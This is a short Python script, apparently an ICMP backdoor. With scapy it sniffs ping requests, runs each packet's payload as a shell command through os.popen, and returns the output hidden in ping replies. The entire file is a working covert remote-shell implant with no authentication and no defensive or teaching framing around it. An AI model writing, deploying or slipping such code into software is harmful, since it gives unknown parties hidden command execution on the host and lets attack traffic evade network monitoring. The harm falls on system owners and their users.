from scapy.all import *
import os

# Function to handle incoming ICMP packets
def icmp_callback(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # ICMP Echo Request
        command = packet[Raw].load.decode()  # Extract the command from the packet
        print(f"Received command: {command}")

        # Execute the command and capture the output
        try:
            result = os.popen(command).read()  # Executes the command and reads the output
            if not result:
                result = "No output or command failed."
        except Exception as e:
            result = f"Error executing command: {str(e)}"
        
        # Create an ICMP Echo Reply with the result
        reply = IP(dst=packet[IP].src)/ICMP(type=0, id=packet[ICMP].id)/Raw(load=result)
        send(reply)  # Send the reply back to the source

# Start sniffing for ICMP packets (filter for ICMP type 8, Echo Request)
print("Listening for ICMP Echo Requests... (Press Ctrl+C to stop)")
sniff(filter="icmp", prn=icmp_callback)
